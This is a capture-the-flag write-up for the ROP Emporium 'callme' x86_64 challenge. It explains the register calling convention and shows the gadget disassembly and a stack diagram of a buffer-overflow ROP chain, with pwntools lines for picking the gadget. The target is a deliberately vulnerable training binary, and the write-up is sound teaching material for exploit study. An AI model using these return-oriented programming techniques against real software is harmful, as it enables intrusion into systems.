# ROP Emporium - Callme (x86_64)

## Challenge Overview

The goal is to call three functions in sequence: `callme_one()`, `callme_two()`, `callme_three()` with specific arguments to retrieve the flag.

Each function must be called with these arguments:
- arg1: `0xdeadbeefdeadbeef`
- arg2: `0xcafebabecafebabe`
- arg3: `0xd00df00dd00df00d`

## x86_64 Calling Convention

In x86_64 System V ABI, function arguments are passed in registers:

| Register | Argument |
|----------|----------|
| `rdi`    | 1st arg  |
| `rsi`    | 2nd arg  |
| `rdx`    | 3rd arg  |

## Finding the Gadget

Using pwndbg to disassemble `usefulGadgets`:

```
pwndbg> disass usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x000000000040093c <+0>:     pop    rdi
   0x000000000040093d <+1>:     pop    rsi
   0x000000000040093e <+2>:     pop    rdx
   0x000000000040093f <+3>:     ret
End of assembler dump.
```

This gadget at `0x40093c` pops three values from the stack into the argument registers, then returns.

## Stack Layout

```
┌─────────────────────────┐
│   'A' * 40 (padding)    │  <- overflow buffer
├─────────────────────────┤
│   0x40093c (gadget)     │  <- return address
├─────────────────────────┤
│   0xdeadbeefdeadbeef    │  -> rdi (arg1)
├─────────────────────────┤
│   0xcafebabecafebabe    │  -> rsi (arg2)
├─────────────────────────┤
│   0xd00df00dd00df00d    │  -> rdx (arg3)
├─────────────────────────┤
│   callme_one@plt        │  <- ret jumps here
├─────────────────────────┤
│   0x40093c (gadget)     │  <- callme_one returns here
├─────────────────────────┤
│   ... repeat for two    │
├─────────────────────────┤
│   ... repeat for three  │
└─────────────────────────┘
```


## Common Mistake

Using `pop rdi; ret` instead of `pop rdi; pop rsi; pop rdx; ret`:

```python
# WRONG - only pops one argument
gadget = p64(rop.find_gadget(['pop rdi', 'ret'])[0])

# CORRECT - pops all three arguments
gadget = p64(rop.find_gadget(['pop rdi', 'pop rsi', 'pop rdx', 'ret'])[0])
# or hardcode: gadget = p64(0x40093c)
```

With the wrong gadget, `ret` will try to jump to `arg2` instead of the target function, causing a crash.
